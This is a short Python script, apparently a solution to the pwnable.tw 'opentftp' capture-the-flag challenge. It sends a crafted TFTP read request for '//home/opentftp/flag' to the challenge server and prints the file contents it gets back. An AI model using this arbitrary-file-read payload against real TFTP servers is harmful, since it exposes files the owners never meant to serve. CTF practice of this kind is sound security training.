from pwn import *
import struct
import socket

# Connect to the given remote
chall = 'chall.pwnable.tw'
nc_port = 10206
io = remote(chall, nc_port)

# Read & remind which UDP port we have to use for TFTP
io.recvuntil(b'start challenge on udp port: ')
udp_port = int(io.recvlineS(keepends = False))
opentftp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Send a payload to read the flag file (as ASCII)
payload = struct.pack('>H', 1) + b'//home/opentftp/flag\0' + b'ascii\0'
opentftp.sendto(payload, (chall, udp_port))
result = opentftp.recv(1024)

# Print it
print(str(result[3:], encoding='utf-8'))

# Close the connection
io.close()
